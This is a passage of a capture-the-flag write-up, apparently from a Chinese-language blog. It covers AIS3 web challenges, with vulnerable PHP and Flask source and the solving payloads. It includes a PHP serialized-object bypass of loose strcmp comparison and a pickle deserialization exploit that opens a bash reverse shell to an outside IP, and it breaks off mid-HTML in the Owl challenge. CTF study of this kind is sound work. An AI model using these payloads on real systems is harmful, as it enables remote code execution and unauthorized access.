class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="title function_ invoke__">rand</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strcmp</span>(<span class="variable">$flag</span>, <span class="variable">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(SESSION, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(SESSION, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)), <span class="title function_ invoke__">time</span>() + <span class="number">600</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$data</span> = @<span class="variable">$_COOKIE</span>[SESSION]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Elephant&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> id=<span class="string">&quot;bootstrap-css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="variable">$user</span>): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div id=<span class="string">&quot;login&quot;</span>&gt;</span><br><span class="line">            &lt;h3 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">white</span> <span class="title">pt</span>-5&quot;&gt;<span class="title">Are</span> <span class="title">you</span> <span class="title">familiar</span> <span class="title">with</span> <span class="title">PHP</span>?&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">row</span>&quot; <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span> <span class="title">align</span>-<span class="title">items</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">column</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">box</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">form</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">form</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">What</span>&#x27;<span class="title">s</span> <span class="title">your</span> <span class="title">name</span>!?&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Name</span>:&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">name</span>&quot; <span class="title">id</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">info</span> <span class="title">btn</span>-<span class="title">md</span>&quot; <span class="title">value</span>=&quot;<span class="title">let</span> <span class="title">me</span> <span class="title">in</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">white</span> <span class="title">pt</span>-5&quot;&gt;<span class="title">You</span> <span class="title">may</span> <span class="title">want</span> <span class="title">to</span> <span class="title">read</span> <span class="title">the</span> <span class="title">source</span> <span class="title">code</span>.&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">align</span>: <span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">images</span>/<span class="title">elephant2</span>.<span class="title">png</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span> <span class="title">align</span>-<span class="title">items</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Do</span> <span class="title">you</span> <span class="title">know</span>?&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">PHP</span>&#x27;<span class="title">s</span> <span class="title">mascot</span> <span class="title">is</span> <span class="title">an</span> <span class="title">elephant</span>!&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Hello</span>, &lt;<span class="title">b</span>&gt;&lt;?= $<span class="title">user</span>-&gt;<span class="title">name</span> ?&gt;&lt;/<span class="title">b</span>&gt;!</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">user</span>-&gt;<span class="title">canReadFlag</span>()): ?&gt;</span></span><br><span class="line"><span class="class">                            <span class="title">This</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span>: &lt;<span class="title">b</span>&gt;&lt;?= $<span class="title">flag</span> ?&gt;&lt;/<span class="title">b</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">                            <span class="title">Your</span> <span class="title">token</span> <span class="title">is</span> <span class="title">not</span> <span class="title">sufficient</span> <span class="title">to</span> <span class="title">read</span> <span class="title">the</span> <span class="title">flag</span>!</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">logout</span>&quot;&gt;<span class="title">Logout</span>!&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span> ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åªè¦è®“ <code>strcmp($flag, $this-&gt;token) == 0</code> å°±å¥½å•¦ï¼Œé‚£ <code>strcmp</code> å·²çŸ¥çš„å•é¡Œå°±æ˜¯ä»– compare é™£åˆ—éš¨ç„¶æœƒå™´ Warningï¼Œä½†çµæœæœƒæ˜¯ <code>NULL</code>ï¼Œè€Œé€™è£¡æ˜¯ç”¨å…©å€‹ <code>=</code> ä¸æ˜¯ä¸‰å€‹ï¼Œæ‰€ä»¥ <code>NULL == 0</code>ï¼ŒæŠŠä¸‹é¢é€™æ®µ base64 encode å¾Œæ”¾å› Cookie å°±å®Œæˆå•¦ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:11:&quot;\x00User\x00token&quot;;a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;0nly_3l3ph4n75_5h0uld_0wn_1v0ry&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Snake">Snake</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a target="_blank" rel="noopener" href="https://snake.ais3.org/">https://snake.ais3.org/</a> ï¼Œé¦–é å°±æ˜¯åŸå§‹ç¢¼äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> pickle, base64, traceback</span><br><span class="line"></span><br><span class="line">Response.default_mimetype = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = base64.b64decode(data)</span><br><span class="line">            data = pickle.loads(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> traceback.format_exc()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br></pre></td></tr></table></figure>
<p>çµ¦ä»– dataï¼Œä»–æœƒ <code>pickle.loads</code>ï¼Œæ²’æœ‰ä»»ä½•æª¢æŸ¥ï¼Œæ‰€ä»¥ç›´æ¥ reverse shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span>(os.system, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/1.2.3.4/9999 0&gt;&amp;1&quot;&#x27;</span>),))</span><br><span class="line"></span><br><span class="line">ex = Exploit()</span><br><span class="line"><span class="built_in">print</span>(b64decode(pickle.dumps(ex)))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Owl">Owl</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a target="_blank" rel="noopener" href="https://turtowl.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E6%9C%89%E7%99%BB%E5%85%A5%E9%A0%81%E9%9D%A2%EF%BC%8C%E4%BB%96%E6%9C%89%E5%80%8B%E7%99%BD%E8%89%B2%E5%AD%97%E5%AF%AB">https://turtowl.ais3.org/ï¼Œé¦–é æœ‰ç™»å…¥é é¢ï¼Œä»–æœ‰å€‹ç™½è‰²å­—å¯«</a> <code>GUESS THE STUPID USERNAME / PASSWORD</code>ï¼ŒçŒœ <code>admin/admin</code> å°±ç™»é€²å»äº†ï¼Œç™»é€²å»å¾Œï¼Œåˆæœ‰å€‹ç™½è‰²å­—æŒ‰éˆ•å¯« <code>SHOW HINT</code>ï¼Œé»ä¸‹å»å°±çœ‹åˆ°åŸå§‹ç¢¼äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Taipei&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CSRF</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]))</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>() * <span class="title function_ invoke__">rand</span>());</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;csrf.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$csrf</span> = <span class="keyword">new</span> <span class="title class_">Csrf</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$action</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$path</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$message</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$alert</span> = <span class="variable">$message</span> ? <span class="string">&#x27;alert(&#x27;</span> . <span class="title function_ invoke__">json_encode</span>(<span class="variable">$message</span>) . <span class="string">&#x27;)&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$path</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$path</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;<span class="subst">$alert</span>; document.location.replace(<span class="subst">$path</span>);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;logout&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;login&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// Validate CSRF token</span></span><br><span class="line">            <span class="variable">$token</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$token</span> || !<span class="variable">$csrf</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;invalid csrf_token&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if username and password are given</span></span><br><span class="line">            <span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$username</span> || !<span class="variable">$password</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;username and password should not be empty&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of sqlmap kiddies</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="string">&#x27;sqlmap&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;sqlmap is child&#x27;s play&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of you</span></span><br><span class="line">            <span class="variable">$bad</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/*&#x27;</span>, <span class="string">&#x27;*/&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;--&#x27;</span>];</span><br><span class="line">            <span class="variable">$username</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$username</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Auth</span></span><br><span class="line">            <span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$row</span> = (<span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;/db.sqlite3&#x27;</span>))</span><br><span class="line">                -&gt;<span class="title function_ invoke__">querySingle</span>(<span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$hash</span>&#x27;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;login failed&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;unknown action: <span class="subst">$action</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = @<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ğŸ¦‰ğŸ¦‰ğŸ¦‰ğŸ¦‰&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> id=<span class="string">&quot;bootstrap-css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="variable">$user</span>): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div id=<span class="string">&quot;login&quot;</span>&gt;</span><br><span class="line">            &lt;h3 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span 